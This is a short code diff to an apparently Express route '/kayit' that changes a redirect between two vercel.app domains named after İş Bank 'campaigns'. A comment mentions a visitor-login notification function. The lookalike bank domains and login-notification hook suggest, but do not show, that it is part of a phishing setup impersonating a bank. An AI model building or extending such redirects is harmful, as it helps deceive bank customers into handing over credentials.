@@ -83,7 +83,7 @@ app.get('/kayit', (req, res) => {
     // notifyVisitorLogin fonksiyonu yerine istediğiniz işlemleri ekleyebilirsiniz
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://isbank-kampanyalar.vercel.app/');
+    res.redirect('https://isbank-kampanyalar-kayit.vercel.app/');
 });
 
 
